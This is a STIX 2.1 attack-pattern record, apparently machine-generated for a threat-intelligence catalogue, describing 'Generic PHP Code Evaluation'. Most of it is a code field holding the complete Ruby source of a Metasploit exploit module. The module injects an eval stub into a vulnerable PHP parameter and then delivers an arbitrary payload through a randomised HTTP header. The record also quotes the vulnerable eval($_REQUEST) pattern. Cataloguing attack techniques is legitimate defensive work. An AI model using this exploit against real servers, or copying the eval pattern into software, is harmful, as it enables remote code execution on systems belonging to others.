{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ecd07837-1367-4ed0-af75-8f9e18b465d3",
    "created": "2024-08-14T17:12:53.168842Z",
    "modified": "2024-08-14T17:12:53.168846Z",
    "name": "Generic PHP Code Evaluation",
    "description": " Exploits things like <?php eval($_REQUEST['evalme']); ?> It is likely that HTTP evasion options will break this exploit. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/php_eval.rb",
            "external_id": "php_eval.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Generic PHP Code Evaluation',\n      'Description'    => %q{\n        Exploits things like <?php eval($_REQUEST['evalme']); ?>\n        It is likely that HTTP evasion options will break this exploit.\n      },\n      'Author'         => [ 'egypt' ],\n      'License'        => BSD_LICENSE,\n      'References'     => [ ],\n      'Privileged'     => false,\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Payload'        =>\n        {\n          # max header length for Apache,\n          # http://httpd.apache.org/docs/2.2/mod/core.html#limitrequestfieldsize\n          'Space'       => 8190,\n          # max url length for some old versions of apache according to\n          # http://www.boutell.com/newfaq/misc/urllength.html\n          #'Space'       => 4000,\n          'DisableNops' => true,\n          'BadChars'    => %q|'\"`|,  # quotes are escaped by PHP's magic_quotes_gpc in a default install\n          'Compat'      =>\n            {\n              'ConnectionType' => 'find',\n            },\n          'Keys'        => ['php'],\n        },\n      'DisclosureDate' => '2008-10-13',\n      'Targets'        => [ ['Automatic', { }], ],\n      'DefaultTarget' => 0\n      ))\n\n    register_options(\n      [\n        OptString.new('URIPATH',   [ true,  \"The URI to request, with the eval()'d parameter changed to !CODE!\", '/test.php?evalme=!CODE!']),\n        OptString.new('HEADERS',   [false,  \"Any additional HTTP headers to send, cookies for example. Format: \\\"header:value,header2:value2\\\"\"])\n      ])\n\n  end\n\n  def check\n    uri = datastore['PHPURI'].gsub(/\\?.*/, \"\")\n    print_status(\"Checking uri #{uri}\")\n    response = send_request_raw({ 'uri' => uri})\n    if response.code == 200\n      return Exploit::CheckCode::Detected\n    end\n    vprint_error(\"Server responded with #{response.code}\")\n    return Exploit::CheckCode::Safe\n  end\n\n  def datastore_headers\n    headers = datastore['HEADERS'] ? datastore['HEADERS'].dup : \"\"\n    headers_hash = {}\n    if headers && !headers.empty?\n      headers.split(',').each do |header|\n        key, value = header.split(':')\n        headers_hash[key] = value.strip\n      end\n    end\n    headers_hash\n  end\n\n  def exploit\n    # very short timeout because the request may never return if we're\n    # sending a socket payload\n    timeout = 0.01\n\n    headername = \"X-\" + Rex::Text.rand_text_alpha_upper(rand(10)+10)\n    stub = \"error_reporting(0);eval($_SERVER[HTTP_#{headername.gsub(\"-\", \"_\")}]);\"\n\n    uri = datastore['URIPATH'].sub(\"!CODE!\", Rex::Text.uri_encode(stub))\n    print_status(\"Sending request for: http#{ssl ? \"s\" : \"\"}://#{rhost}:#{rport}#{uri}\")\n    print_status(\"Payload will be in a header called #{headername}\")\n\n    response = send_request_raw({\n        'global' => true,\n        'uri' => uri,\n        'headers' => datastore_headers.merge(\n            headername => payload.encoded,\n            'Connection' => 'close')\n      },timeout)\n    if response and response.code != 200\n      print_error(\"Server returned non-200 status code (#{response.code})\")\n    end\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-10-13",
    "x_mitre_platforms": [
        "['php']"
    ]
}